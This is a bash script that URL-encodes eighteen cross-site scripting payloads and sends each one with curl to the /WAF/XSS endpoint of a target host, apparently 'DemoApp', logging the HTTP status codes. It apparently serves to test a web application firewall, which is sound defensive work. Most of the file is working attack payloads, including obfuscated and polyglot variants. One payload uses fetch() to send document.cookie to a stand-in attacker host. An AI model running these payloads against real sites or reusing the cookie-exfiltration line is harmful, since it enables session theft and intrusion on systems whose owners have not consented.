#!/bin/bash
# XSS attacks against DemoApp /WAF/XSS endpoint
set -euo pipefail

TARGET="${1:?Usage: $0 <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] XSS attacks against ${TARGET} /WAF/XSS"

PAYLOADS=(
  '<script>alert("XSS")</script>'
  '<script>alert(document.cookie)</script>'
  '<img src=x onerror=alert(1)>'
  '<svg onload=alert(1)>'
  '<body onload=alert(1)>'
  '"><script>alert(1)</script>'
  "javascript:alert('XSS')"
  '<iframe src="javascript:alert(1)">'
  '<input onfocus=alert(1) autofocus>'
  '<details open ontoggle=alert(1)>'
  '<marquee onstart=alert(1)>'
  '<svg><script>alert(1)</script></svg>'
  '"><img src=x onerror=fetch("https://evil.example/c="+document.cookie)>'
  '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">'
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
  "<script>eval(atob('YWxlcnQoMSk='))</script>"
  '<div style="width:expression(alert(1))">'
  "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//"
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "$payload")
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    "${BASE}/WAF/XSS?update=${encoded}") || code="ERR"
  printf "  [%s] %s\n" "${code}" "${payload:0:80}"
done

echo "[*] XSS suite complete"
